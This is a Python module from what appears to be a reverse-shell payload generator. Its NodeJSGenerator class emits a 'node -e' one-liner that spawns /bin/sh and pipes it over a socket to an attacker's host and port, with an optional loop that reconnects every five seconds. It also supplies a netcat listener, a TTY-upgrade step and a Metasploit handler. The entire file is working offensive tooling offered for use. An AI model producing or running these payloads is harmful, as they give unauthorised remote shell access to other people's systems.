import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, build_listener_setup


class NodeJSGenerator(ShellGenerator):
    language = "nodejs"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = "net_module"
        cmd = self._net_module(opts, names)
        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=f"rlwrap nc -lvnp {opts.lport}",
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_nodejs", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    def _net_module(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        net = self._var("net", names)
        cp = self._var("cp", names)
        sh = self._var("sh", names)
        client = self._var("client", names)

        core = (
            f"var {net}=require(\"net\"),{cp}=require(\"child_process\"),"
            f"{sh}={cp}.spawn(\"/bin/sh\",[]);"
            f"var {client}=new {net}.Socket();"
            f"{client}.connect({opts.lport},\"{opts.lhost}\","
            f"function(){{{client}.pipe({sh}.stdin);{sh}.stdout.pipe({client});{sh}.stderr.pipe({client});}});"
        )

        if opts.retry:
            interval = self._var("iv", names)
            payload = (
                f"var {net}=require(\"net\"),{cp}=require(\"child_process\");"
                f"function c(){{"
                f"var {sh}={cp}.spawn(\"/bin/sh\",[]);"
                f"var {client}=new {net}.Socket();"
                f"{client}.connect({opts.lport},\"{opts.lhost}\","
                f"function(){{{client}.pipe({sh}.stdin);{sh}.stdout.pipe({client});{sh}.stderr.pipe({client});}});"
                f"{client}.on(\"error\",function(){{{sh}.kill();}});"
                f"{client}.on(\"close\",function(){{{sh}.kill();}});"
                f"}}"
                f"var {interval}=setInterval(c,5000);c();"
            )
        else:
            payload = core

        return f"node -e '{payload}'"
